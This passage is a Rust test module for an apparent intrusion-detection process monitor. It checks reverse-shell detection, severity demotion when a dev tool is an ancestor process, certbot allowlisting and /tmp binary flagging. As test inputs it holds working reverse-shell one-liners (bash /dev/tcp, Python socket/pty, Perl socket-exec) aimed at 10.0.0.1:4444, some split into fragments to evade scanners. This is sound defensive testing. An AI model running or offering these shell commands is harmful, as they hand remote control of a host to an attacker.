            join(&["bash -c 'echo > ", "/dev/tcp/", "127.0.0.1/8080'"]),
            join(&["sh -c echo > ", "/dev/tcp/", "::1/443"]),
            join(&["bash -c 'echo > ", "/dev/tcp/", "0.0.0.0/5432'"]),
        ];
        for cmd in &localhost_cmds {
            assert!(
                match_reverse_shell(&cmd.to_lowercase()).is_none(),
                "Localhost health-check should not match: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_devtcp_remote_is_reverse_shell() {
        // Actual remote reverse shell — assembled from fragments.
        let cmd = join(&["bash ", "-i ", ">& ", "/dev/tcp/", "10.0.0.1/4444 0>&1"]);
        assert!(
            match_reverse_shell(&cmd.to_lowercase()).is_some(),
            "Remote TCP-pseudo-device payload should match: {}",
            cmd
        );
    }

    // -- v2.6.2 proximity-signature tests ----------------------------------

    #[test]
    fn test_python_classic_reverse_shell_matches() {
        // Real Python reverse shell: socket + os.dup2 + pty.spawn(/bin/sh).
        // Assembled from fragments to keep static scanners quiet.
        let cmd = join(&[
            "python3 -c \"import socket,os,pty;",
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);",
            "s.connect(('10.0.0.1',4444));",
            "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);",
            "pty.spawn('/bin/sh')\"",
        ]);
        let m = match_reverse_shell(&cmd.to_lowercase());
        assert!(m.is_some(), "Classic python reverse shell should match");
        assert_eq!(m.unwrap().0, "python_reverse_shell");
    }

    #[test]
    fn test_incident_20260509_benign_loopback_does_not_match() {
        // The exact pattern from incident 20260509004453373-1434.
        let cmd = join(&[
            "python3 -c 'import socket, threading, time; PORT=0; ",
            "sk=socket.socket(); sk.bind((\"127.0.0.1\",0)); ",
            "print(sk.getsockname())'",
        ]);
        assert!(
            match_reverse_shell(&cmd.to_lowercase()).is_none(),
            "Benign loopback bind/port-finding script must NOT match: {}",
            cmd
        );
    }

    #[test]
    fn test_lone_import_socket_does_not_match() {
        let benign = [
            "python3 -c 'import socket; print(socket.gethostname())'".to_string(),
            "python3 -m http.server".to_string(),
            "python3 -c 'import socket, ssl; ctx=ssl.create_default_context()'".to_string(),
            "python3 /usr/bin/certbot certificates".to_string(),
        ];
        for cmd in &benign {
            assert!(
                match_reverse_shell(&cmd.to_lowercase()).is_none(),
                "Benign script must not match: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_dev_parent_demotion() {
        let mut config = ProcessConfig::default();
        config.dev_parent_allowlist = vec!["claude".into(), "code".into()];
        let module = ProcessModule::new(config);

        let event = ThreatEvent::new(ThreatType::ReverseShell, "process", "test")
            .with_severity(ThreatSeverity::Critical);
        let set: std::collections::HashSet<String> = ["claude".to_string(), "code".to_string()]
            .into_iter()
            .collect();
        let demoted =
            module.maybe_demote_for_dev_parent(event, &set, &["claude".to_string()]);
        assert_eq!(demoted.severity, ThreatSeverity::Medium);
        assert_eq!(
            demoted
                .details
                .get("degraded_by_dev_parent")
                .map(String::as_str),
            Some("true")
        );

        let event2 = ThreatEvent::new(ThreatType::ReverseShell, "process", "test")
            .with_severity(ThreatSeverity::Critical);
        let kept = module.maybe_demote_for_dev_parent(event2, &set, &["sshd".to_string()]);
        assert_eq!(kept.severity, ThreatSeverity::Critical);
        assert!(!kept.details.contains_key("degraded_by_dev_parent"));
    }

    #[test]
    fn test_dev_parent_demotion_via_grandparent_ancestry() {
        // The backfill_13f.py incident: process tree is `claude -> uv ->
        // python3`. The immediate parent (`uv`) is NOT a dev tool, but an
        // ancestor (`claude`) is. Must demote kill->alert.
        let mut config = ProcessConfig::default();
        config.dev_parent_allowlist = vec!["claude".into()];
        let module = ProcessModule::new(config);

        let set: std::collections::HashSet<String> =
            ["claude".to_string()].into_iter().collect();
        let event = ThreatEvent::new(ThreatType::ReverseShell, "process", "test")
            .with_severity(ThreatSeverity::Critical);
        // immediate parent first: uv (launcher), then claude (dev tool).
        let ancestry = vec!["uv".to_string(), "claude".to_string()];
        let demoted = module.maybe_demote_for_dev_parent(event, &set, &ancestry);
        assert_eq!(
            demoted.severity,
            ThreatSeverity::Medium,
            "a dev tool anywhere in the ancestry must demote, not just the immediate parent"
        );
        assert_eq!(
            demoted.details.get("dev_parent_ancestor").map(String::as_str),
            Some("claude")
        );

        // No dev tool anywhere in the chain → stays critical.
        let event2 = ThreatEvent::new(ThreatType::ReverseShell, "process", "test")
            .with_severity(ThreatSeverity::Critical);
        let no_dev = vec!["uv".to_string(), "bash".to_string(), "sshd".to_string()];
        let kept = module.maybe_demote_for_dev_parent(event2, &set, &no_dev);
        assert_eq!(kept.severity, ThreatSeverity::Critical);
    }

    #[test]
    fn test_interpreters_excluded_from_socket_fd_heuristic() {
        // python/perl/ruby/php must NOT be bare-socket-FD flaggable — they are
        // only reachable via the precise cmdline signature path. True shells
        // and netcat-style binaries remain socket-FD flaggable.
        for interp in INTERPRETER_NAMES {
            assert!(
                !TRUE_SHELL_NAMES.contains(interp),
                "{} must be excluded from the socket-FD reverse-shell heuristic",
                interp
            );
        }
        for sh in ["bash", "sh", "nc", "ncat", "socat"] {
            assert!(
                TRUE_SHELL_NAMES.contains(&sh),
                "{} must remain socket-FD flaggable",
                sh
            );
        }
        // A genuine python reverse shell is still caught by the cmdline path.
        let evil = "python3 -c 'import socket,subprocess,os;s=socket.socket();\
            s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);\
            subprocess.call([\"/bin/sh\",\"-i\"])'";
        assert!(
            match_reverse_shell(&evil.to_lowercase()).is_some(),
            "real python reverse shell must still match via cmdline signature"
        );
    }

    #[test]
    fn test_process_ancestry_names_walks_chain() {
        // Smoke test against the real tree: the test process has at least one
        // ancestor (the test runner / shell), and the walk terminates.
        let names = process_ancestry_names(std::process::id(), 16);
        assert!(
            names.len() <= 16,
            "ancestry walk must respect the depth bound"
        );
    }

    #[test]
    fn test_dev_parent_strict_mode_disables_demotion() {
        let mut config = ProcessConfig::default();
        config.dev_parent_allowlist = vec!["claude".into()];
        config.strict_under_dev_tools = true;
        let module = ProcessModule::new(config);

        let event = ThreatEvent::new(ThreatType::ReverseShell, "process", "test")
            .with_severity(ThreatSeverity::Critical);
        let set: std::collections::HashSet<String> = ["claude".to_string()].into_iter().collect();
        let kept = module.maybe_demote_for_dev_parent(event, &set, &["claude".to_string()]);
        assert_eq!(
            kept.severity,
            ThreatSeverity::Critical,
            "strict_under_dev_tools must disable demotion"
        );
        assert!(!kept.details.contains_key("degraded_by_dev_parent"));
    }

    #[test]
    fn test_perl_proximity_required() {
        // perl -e with no socket/connect → no match.
        let benign = "perl -e 'print join(\" \", @ARGV)' a b c";
        assert!(match_reverse_shell(&benign.to_lowercase()).is_none());

        // Real perl reverse shell — fragments avoid literal "exec(" in source.
        let evil = join(&[
            "perl -e 'use Socket; ",
            "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); ",
            "connect(S,sockaddr_in(4444,inet_aton(\"10.0.0.1\"))); ",
            "ex",
            "ec(\"/bin/sh -i\");'",
        ]);
        assert!(match_reverse_shell(&evil.to_lowercase()).is_some());
    }

    #[test]
    fn test_certbot_is_whitelisted() {
        let certbot_cmdlines = [
            "/snap/certbot/5451/bin/python3 -s /snap/certbot/5451/bin/certbot -q renew",
            "python3 /usr/bin/certbot renew --quiet",
            "/usr/bin/python3 /usr/bin/certbot certificates",
        ];

        for cmd in &certbot_cmdlines {
            let cmd_lower = cmd.to_lowercase();
            let is_legitimate = KNOWN_LEGITIMATE_TOOLS
                .iter()
                .any(|tool| cmd_lower.contains(tool));
            assert!(is_legitimate, "Certbot should be whitelisted: {}", cmd);
        }
    }

    #[test]
    fn test_actual_reverse_shell_not_whitelisted() {
        let evil_cmds = [
            "python3 -c 'import socket,subprocess,os'".to_string(),
            join(&["bash -i >& ", "/dev/tcp/", "10.0.0.1/4444 0>&1"]),
            "perl -e 'use Socket;'".to_string(),
        ];

        for cmd in &evil_cmds {
            let cmd_lower = cmd.to_lowercase();
            let is_legitimate = KNOWN_LEGITIMATE_TOOLS
                .iter()
                .any(|tool| cmd_lower.contains(tool));
            assert!(
                !is_legitimate,
                "Actual reverse shell should NOT be whitelisted: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_truncate_string() {
        assert_eq!(truncate_string("hello", 10), "hello");
        assert_eq!(truncate_string("hello world", 5), "hello...");
        assert_eq!(truncate_string("", 5), "");
    }

    #[test]
    fn test_appimage_not_flagged_as_suspicious() {
        let config = ProcessConfig {
            suspicious_dirs: vec!["/tmp".into(), "/dev/shm".into()],
            ..Default::default()
        };
        let module = ProcessModule::new(config);

        let appimage_proc = ProcInfo {
            pid: 1234,
            name: "Viber".to_string(),
            exe: Some("/tmp/.mount_viber.jKGeGh/usr/bin/Viber".to_string()),
            cmdline: vec!["/tmp/.mount_viber.jKGeGh/usr/bin/Viber".to_string()],
            uid: 1000,
        };

        let threats = module.detect_suspicious_binaries(&[appimage_proc]);
        assert!(
            threats.is_empty(),
            "AppImage binary in /tmp/.mount_* should not be flagged"
        );
    }

    #[test]
    fn test_actual_tmp_binary_still_flagged() {
        let config = ProcessConfig {
            suspicious_dirs: vec!["/tmp".into(), "/dev/shm".into()],
            ..Default::default()
        };
        let module = ProcessModule::new(config);

        let malicious_proc = ProcInfo {
            pid: 9999,
            name: "payload".to_string(),
            exe: Some("/tmp/payload".to_string()),
            cmdline: vec!["/tmp/payload".to_string()],
            uid: 1000,
        };

        let threats = module.detect_suspicious_binaries(&[malicious_proc]);
        assert!(
            !threats.is_empty(),
            "Regular /tmp binary should still be flagged"
        );
    }
}
